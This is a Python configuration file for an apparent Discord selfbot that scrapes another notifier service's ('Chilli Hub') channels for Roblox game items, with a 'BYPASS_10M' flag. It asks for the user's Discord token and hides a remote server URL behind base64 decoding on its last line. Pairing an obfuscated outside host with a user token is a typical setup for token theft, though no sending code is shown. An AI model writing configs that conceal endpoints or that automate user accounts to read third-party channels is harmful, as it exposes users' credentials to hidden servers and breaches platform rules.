import os  
DISCORD_TOKEN = ""  
MONEY_THRESHOLD = (3.0, 999.0) 
PLAYER_TRESHOLD = 8 
IGNORE_UNKNOWN = True 
IGNORE_LIST = [""] 
FILTER_BY_NAME = False, ["Graipuss Medussi", "La Grande Combinasion"] 
BYPASS_10M = True 
WEBSOCKET_PORT = 51948 
DISCORD_WS_URL = "wss://gateway.discord.gg/?v=10&encoding-json" 
CHILLI_HUB_CHANNELS_ID = {
    "under_500k": ["1401774723246854204", "1401774863974268959"], 
    "500k_1m": ["1401774956404277378", "1401775012083404931"], 
    "1m-10m": ["1401775061706346536", "1401775125765947442"], 
    "10m_plus": ["1401775181025775738"] 
}
VALID_KEYS = os.getenv("VALID_KEYS", "").split(',')
SERVER_URL = __import__("base64").b64decode("aHR0cHM6Ly9zZXJ2ZXJoYWhhLm9ucmVuZGVyLmNvbQ==").decode()
